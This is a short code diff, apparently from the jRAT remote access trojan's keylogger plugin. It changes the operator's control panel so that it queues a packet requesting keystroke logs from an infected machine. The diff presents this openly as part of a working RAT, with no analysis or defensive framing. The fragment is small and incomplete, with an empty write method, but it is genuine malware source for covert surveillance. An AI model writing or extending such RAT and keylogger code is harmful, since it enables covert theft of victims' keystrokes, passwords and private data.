@@ -3,6 +3,8 @@ package pro.jrat.plugin.client;
 import java.awt.Color;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 
 import javax.swing.ButtonGroup;
 import javax.swing.GroupLayout;
@@ -20,6 +22,8 @@ import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
 
 import pro.jrat.api.BaseControlPanel;
+import pro.jrat.api.PacketBuilder;
+import pro.jrat.api.RATObject;
 
 
 @SuppressWarnings("serial")
@@ -108,6 +112,17 @@ public class PanelKeylogger extends BaseControlPanel {
 
 		title = textPane.addStyle("title", null);
         StyleConstants.setForeground(title, Color.green.darker());
+        
+        try {
+			getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getServer()) {
+				@Override
+				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
+					
+				}
+			});
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 	
 	public DefaultMutableTreeNode getRoot() {
